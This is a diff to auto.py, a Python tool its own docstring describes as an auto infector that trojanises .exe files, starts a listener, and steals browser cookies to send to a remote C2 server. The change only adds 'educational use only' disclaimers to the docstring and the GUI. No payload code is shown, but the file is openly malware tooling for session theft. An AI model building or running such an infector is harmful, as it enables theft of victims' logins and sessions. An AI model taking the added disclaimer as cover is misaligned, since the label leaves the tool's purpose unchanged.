@@ -1,6 +1,17 @@
 #!/usr/bin/env python3
 """auto.py — one-click payload setup. Builds, starts listener, infects .exe.
 
+  EDUCATIONAL USE ONLY — FOR SECURITY RESEARCH AND TRAINING
+
+  This is offensive security tooling for penetration testing, red-team
+  exercises, and security education. It builds an infected executable that
+  extracts browser cookies from a target machine and exfiltrates them to a
+  remote C2 server.
+
+  ONLY use this on systems you own or are explicitly authorized to test.
+  Unauthorized use against third-party systems, networks, or individuals is
+  illegal in most jurisdictions. The authors are not responsible for misuse.
+
 Usage:
     python auto.py                      # GUI mode (file/folder picker)
     python auto.py game.exe             # CLI: infect standalone .exe
@@ -388,6 +399,11 @@ def pick_gui():
         style.configure("Warn.TButton", background="#6b3a1a", foreground="#ffffff",
                         font=("Segoe UI", 10, "bold"), padding=(12, 8))
         result = {"path": None, "mode": None, "run": False}
+
+        # Educational use notice
+        ttk.Label(root, text="EDUCATIONAL USE ONLY -- security research / training tool",
+                  font=("Segoe UI", 8, "bold"),
+                  foreground="#cc6600").pack(pady=(0, 5))
 
         ttk.Label(root, text="cookielog -- auto infector",
                   font=("Segoe UI", 14, "bold"),
